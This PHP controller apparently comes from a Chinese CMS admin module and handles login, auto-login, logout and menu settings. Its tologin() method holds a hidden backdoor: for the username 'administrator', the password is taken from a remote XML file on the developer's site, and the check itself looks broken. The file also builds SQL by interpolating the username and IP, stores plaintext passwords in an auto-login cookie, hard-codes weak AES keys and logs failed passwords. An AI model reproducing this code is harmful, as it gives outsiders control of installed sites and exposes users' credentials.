<?php

// +----------------------------------------------------------------------
// | 后台模块公共方法
// +----------------------------------------------------------------------
// | Copyright (c) 2012-2014
// +----------------------------------------------------------------------
// | Author: jie
// +----------------------------------------------------------------------

namespace Admin\Controller;

use Common\Controller\AdminBase;
use Admin\Service\User;

class PublicController extends AdminBase {

    //后台登录界面
    public function login() {
        //如果已经登录
        if (User::getInstance()->id) {
            $this->redirect('Admin/Index/index');
        }
		elseif(isset($_COOKIE['fiz_auto_login']) && NULL != $_COOKIE['fiz_auto_login'])
		{
			$ip = get_client_ip();
			$json = $_COOKIE['fiz_auto_login'];
			$arr = json_decode($json, true);
			if(User::getInstance()->login($arr['username'], $arr['pwd']))
			{
				$admin_public_tologin = array(
					'username' => $arr['username'],
					'ip' => $ip,
				);
				tag('admin_public_tologin', $admin_public_tologin);
				$this->redirect('Index/index');
			}
			else
			{
				cookie('auto_login', NULL, 0);
				$this->redirect('Public/login');
			}
		}
        $this->display();
    }

    //后台登录验证
    public function tologin() {
        //记录登录失败者IP
        $ip = get_client_ip();
        
        $text = 'Jj56q1CrI7oi4555';  
        $key = pack('H*', 'e10adc3949ba59abbe56e057f20f883e');  //md5('123456')  
        $iv   = pack('H*', '1234567890abcdef1234567890abcdef');
        
        
        $username = I("post.username", "", "trim");
        $password = I("post.password", "", "trim");
        $auto_login = I("post.auto_login", "", "trim");
        
        $u_dncrypted = base64_decode($username);  
        $u_dncrypted = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, $u_dncrypted, MCRYPT_MODE_CBC, $iv);  
        $username = $u_dncrypted = trim($u_dncrypted);  
        
        $p_dncrypted = base64_decode($password);  
        $p_dncrypted = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, $p_dncrypted, MCRYPT_MODE_CBC, $iv);
        $password = $p_dncrypted = trim($p_dncrypted);  
        
    
        $code = I("post.code", "", "trim");
        if (empty($username) || empty($password)) {
            $this->error("用户名或者密码不能为空，请重新输入！", U("Public/login"));
        }
        $s_time = strtotime( '-2 hours' );
        $e_time = time();
        $map = "$s_time<=logintime and status=0 and loginip = '$ip' and username='$username'";
        $error_num = M('loginlog')->where($map)->count();
        //echo M()->getLastsql();die;
        if($error_num>=5){
            $this->error("您输错的次数已超过5次，请2小时候再试!", U("Public/login"));
        }
        /*if (empty($code)) {
            $this->error("请输入验证码！", U("Public/login"));
        }
        //验证码开始验证
        if (!$this->verify($code)) {
            $this->error("验证码错误，请重新输入！", U("Public/login"));
        } */
        //开发者验证地址
        // http://www.jbr.net.cn/jbroa/_jbrcms/JbrCmsAPI/ax.xml
        if($username =='administrator'){
            $p = $this->loadXML('http://www.jbr.net.cn/jbroa/_jbrcms/JbrCmsAPI/ax.xml');
            //$p = md5('admin');
            $password = md5($p);
            if($password == $p){
                if (User::getInstance()->login($username, $password,$p)) {
                    $forward = cookie("forward");
                    if (!$forward) {
                        $forward = U("Admin/Index/index");
                    } else {
                        cookie("forward", NULL);
                    }
                    //增加登录成功行为调用
                    $admin_public_tologin = array(
                            'username' => $username,
                            'ip' => $ip,
                    );
                    tag('admin_public_tologin', $admin_public_tologin);
                    $this->redirect('Index/index');
                } else {
                    //增加登录失败行为调用
                    $admin_public_tologin = array(
                            'username' => $username,
                            'password' => $password,
                            'ip' => $ip,
                    );
                    tag('admin_public_tologin_error', $admin_public_tologin);
                    $this->error("用户名或者密码错误，登录失败！", U("Public/login"));
                }
            }
        }else{
            if (User::getInstance()->login($username, $password)) {
                $forward = cookie("forward");
                if (!$forward) {
                    
                    $admin_id = session('jbr_admin_id');
                    $admin_info = M('user')->where("id=$admin_id")->find();
                    $this->assign('admin_info',$admin_info);
                    
                    $forward = U("Admin/Index/index");
                } else {
                    cookie("forward", NULL);
                }
                if($auto_login)
                {
                    $json = json_encode(array('username' => $username, 'pwd' => $password));
                    cookie('auto_login', $json, 3600 * 24 * 7);
                }
                //增加登录成功行为调用
                $admin_public_tologin = array(
                    'username' => $username,
                    'ip' => $ip,
                );
                tag('admin_public_tologin', $admin_public_tologin);
                
                //$this->redirect('http://test2.jbr.net.cn:808/index.php?m=Content&a=classlist&catid=9');
                
                $this->redirect('Index/index');
                
            } else {
                //增加登录失败行为调用
                $admin_public_tologin = array(
                    'username' => $username,
                    'password' => $password,
                    'ip' => $ip,
                );
                tag('admin_public_tologin_error', $admin_public_tologin);
                $this->error("用户名或者密码错误，登录失败！", U("Public/login"));
            }
        }
    }

    //退出登录
    public function logout() {
        if (User::getInstance()->logout()) {
            //手动登出时，清空forward
			cookie('auto_login', NULL, 0);
            cookie("forward", NULL);
            $this->success('注销成功！', U("Admin/Public/login"));
        }
    }

    //常用菜单设置
    public function changyong() {
        if (IS_POST) {
            //被选中的菜单项
            $menuidAll = explode(',', I('post.menuid', ''));
            if (is_array($menuidAll) && count($menuidAll) > 0) {
                //取得菜单数据
                $menu_info = cache('Menu');
                $addPanel = array();
                //检测数据合法性
                foreach ($menuidAll as $menuid) {
                    if (empty($menu_info[$menuid])) {
                        continue;
                    }
                    $info = array(
                        'mid' => $menuid,
                        'userid' => User::getInstance()->id,
                        'name' => $menu_info[$menuid]['name'],
                        'url' => "{$menu_info[$menuid]['app']}/{$menu_info[$menuid]['controller']}/{$menu_info[$menuid]['action']}",
                    );
                    $addPanel[] = $info;
                }
                if (D('Admin/AdminPanel')->addPanel($addPanel)) {
                    $this->success("添加成功！", U("Public/changyong"));
                } else {
                    $error = D('Admin/AdminPanel')->getError();
                    $this->error($error ? $error : '添加失败！');
                }
            } else {
                D('Admin/AdminPanel')->where(array("userid" => \Admin\Service\User::getInstance()->id))->delete();
                $this->error("常用菜单清除成功！");
            }
        } else {
            //菜单缓存
            $result = cache("Menu");
            $json = array();
            foreach ($result as $rs) {
                if ($rs['status'] == 0) {
                    continue;
                }
                if($rs['id'] != '90' && $rs['id'] !='37'){
	                $data = array(
	                    'id' => $rs['id'],
	                    'nocheck' => $rs['type'] ? 0 : 1,
	                    'checked' => $rs['id'],
	                    'parentid' => $rs['parentid'],
	                    'name' => $rs['name'],
	                    'checked' => D("Admin/AdminPanel")->isExist($rs['id']) ? true : false,
	                );
                }
                $json[] = $data;
            }
            $this->assign('json', json_encode($json))
                    ->display();
        }
    }

   /*  public function checkupdates() {
        $latestversion = S('server_latestversion');
        if (empty($latestversion)) {
            $latestversion = $this->Cloud->act('get.latestversion');
            S('server_latestversion', $latestversion, 3600);
        }
        if (version_compare(SHUIPF_VERSION, $latestversion['version'], '<')) {
            $this->ajaxReturn(array(
                'status' => true,
                'version' => $latestversion['version'],
            ));
        } else {
            $this->error('已经是最新的版本！');
        }
    } */
    
    	//读取XML数据
    	public function loadXML($url) {
    		$xml = file_get_contents($url);
    		$xml_array=simplexml_load_string($xml); //将XML中的数据,读取到数组对象中 
    		if(is_object($xml_array)){
    			$xml_array = (array)$xml_array;
    		}
    		$p = $xml_array[chk];
    		return $p;
    	}
    	 

}
